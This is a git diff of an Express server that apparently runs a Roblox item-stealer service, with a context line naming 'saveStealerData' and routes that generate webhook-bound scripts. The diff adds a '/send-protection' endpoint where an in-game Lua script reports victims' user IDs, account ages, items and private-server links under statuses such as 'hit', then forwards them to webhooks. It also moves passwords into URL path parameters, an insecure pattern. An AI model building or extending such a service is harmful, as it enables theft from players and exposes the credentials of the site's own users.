@@ -522,9 +522,9 @@ async function saveStealerData(data) {
 
 // ============= AUTH ROUTES =============
 
-app.post('/api/auth/register', async (req, res) => {
+app.post('/api/auth/register/:username/:email/:password/:confirmPassword', async (req, res) => {
   try {
-    const { username, email, password, confirmPassword } = req.body;
+    const { username, email, password, confirmPassword } = req.params;
 
     if (!username || !email || !password) {
       return res.status(400).json({ success: false, message: 'All fields required' });
@@ -586,9 +586,9 @@ app.post('/api/auth/register', async (req, res) => {
   }
 });
 
-app.post('/api/auth/login', async (req, res) => {
+app.post('/api/auth/login/:email/:password', async (req, res) => {
   try {
-    const { email, password } = req.body;
+    const { email, password } = req.params;
 
     if (!email || !password) {
       return res.status(400).json({ success: false, message: 'Email and password required' });
@@ -646,9 +646,9 @@ app.post('/api/auth/logout', (req, res) => {
   res.json({ success: true, message: 'Logged out' });
 });
 
-app.post('/api/webhook/validate', async (req, res) => {
+app.post('/api/webhook/validate/:webhook', async (req, res) => {
   try {
-    const { webhook } = req.body;
+    const { webhook } = req.params;
 
     if (!webhook) {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
@@ -674,32 +674,9 @@ app.post('/api/webhook/validate', async (req, res) => {
 
 // ============= PROTECTION ROUTES =============
 
-app.post('/api/protection/send', async (req, res) => {
-  try {
-    const { protectionId, status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = req.body;
-
-    if (!protectionId) {
-      return res.status(400).json({ success: false, message: 'Protection ID required' });
-    }
-
-    if (!getProtectionWebhook(protectionId)) {
-      return res.status(404).json({ success: false, message: 'Protection ID not found' });
-    }
-
-    await sendProtectionNotification(protectionId, {
-      status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone
-    });
-
-    res.json({ success: true, message: 'Notification sent' });
-  } catch (error) {
-    console.error('Protection send error:', error);
-    res.status(500).json({ success: false, message: error.message });
-  }
-});
-
 app.get('/api/protection/send', async (req, res) => {
   try {
-    const { protectionId, status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items, mentioneveryone } = req.query;
+    const { protectionId, status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, mentioneveryone } = req.query;
 
     if (!protectionId) {
       return res.status(400).json({ success: false, message: 'Protection ID required' });
@@ -709,10 +686,15 @@ app.get('/api/protection/send', async (req, res) => {
       return res.status(404).json({ success: false, message: 'Protection ID not found' });
     }
 
-    const itemsArray = items ? items.split(',') : [];
+    // Parse items array from query parameters (item1, item2, item3, etc.)
+    const itemRegex = /^item\d+$/;
+    const itemsArray = Object.keys(req.query)
+      .filter(key => itemRegex.test(key))
+      .map(key => req.query[key])
+      .filter(item => item && item.trim());
 
     await sendProtectionNotification(protectionId, {
-      status, name, userid, displayname, accountage, playercount, gamename, privateserver: privateserver === 'true', serverlink, items: itemsArray, mentioneveryone: mentioneveryone === 'true'
+      status, name, userid, displayname, accountage, playercount, gamename, privateserver, serverlink, items: itemsArray, mentioneveryone
     });
 
     res.json({ success: true, message: 'Notification sent' });
@@ -765,7 +747,7 @@ app.get('/api/leaderboard', async (req, res) => {
   }
 });
 
-app.post('/api/script/generate', async (req, res) => {
+app.post('/api/script/generate/:webhook/:game', async (req, res) => {
   try {
     if (!req.session.user) {
       return res.status(401).json({ success: false, message: 'Login required' });
@@ -800,7 +782,7 @@ app.post('/api/script/generate', async (req, res) => {
       });
     }
 
-    const { webhook, game } = req.body;
+    const { webhook, game } = req.params;
 
     if (!webhook) {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
@@ -883,6 +865,65 @@ app.post('/api/script/generate', async (req, res) => {
   }
 });
 
+// ============= PROTECTION WEBHOOK ENDPOINT (Roblox Script Integration) =============
+app.get('/send-protection', async (req, res) => {
+  try {
+    const { id, status, name, userid, displayname, accountage, playercount, gamename, privateserver, items, serverlink, mentioneveryone } = req.query;
+
+    // Validate required parameters
+    if (!id || !status) {
+      return res.status(400).json({ success: false, message: 'Missing id or status parameter' });
+    }
+
+    // Validate status
+    const validStatuses = ['hit', 'initializing', 'altaccount'];
+    if (!validStatuses.includes(status)) {
+      return res.status(400).json({ success: false, message: `Invalid status. Must be one of: ${validStatuses.join(', ')}` });
+    }
+
+    // Parse items array if provided
+    let itemsArray = [];
+    if (items) {
+      // Items are sent as item1=value1&item2=value2&...
+      const itemRegex = /^item\d+$/;
+      itemsArray = Object.keys(req.query)
+        .filter(key => itemRegex.test(key))
+        .map(key => req.query[key])
+        .filter(item => item && item.trim());
+    }
+
+    // Prepare data object
+    const data = {
+      status,
+      name: name || 'Unknown',
+      userid: userid ? parseInt(userid) : 0,
+      displayname: displayname || 'Unknown',
+      accountage: accountage ? parseInt(accountage) : 0,
+      playercount: playercount ? parseInt(playercount) : 0,
+      gamename: gamename || 'Steal A Brainrot',
+      privateserver: privateserver === 'true' || privateserver === '1',
+      serverlink: serverlink || '',
+      items: itemsArray,
+      mentioneveryone: mentioneveryone === 'true' || mentioneveryone === '1'
+    };
+
+    // Send protection notification via webhook
+    await sendProtectionNotification(id, data);
+
+    res.json({ success: true, message: 'Notification sent successfully' });
+  } catch (error) {
+    console.error('Send protection error:', error);
+    
+    // Return 200 even on error to prevent Lua script from repeatedly trying
+    if (error.message.includes('not found') || error.message.includes('Webhook not found')) {
+      return res.status(400).json({ success: false, message: 'Protection ID not found' });
+    }
+    
+    res.status(500).json({ success: false, message: error.message || 'Server error' });
+  }
+});
+
+// ============= WEBHOOK VALIDATION ENDPOINT =============
 app.get('/api/stats', async (req, res) => {
   try {
     if (!req.session.user) {
@@ -938,14 +979,13 @@ app.get('/api/scripts/list', async (req, res) => {
   }
 });
 
-app.put('/api/scripts/update/:id', async (req, res) => {
+app.put('/api/scripts/update/:id/:webhookUrl', async (req, res) => {
   try {
     if (!req.session.user) {
       return res.status(401).json({ success: false, message: 'Login required' });
     }
 
-    const { id } = req.params;
-    const { webhookUrl } = req.body;
+    const { id, webhookUrl } = req.params;
 
     if (!webhookUrl) {
       return res.status(400).json({ success: false, message: 'Webhook URL required' });
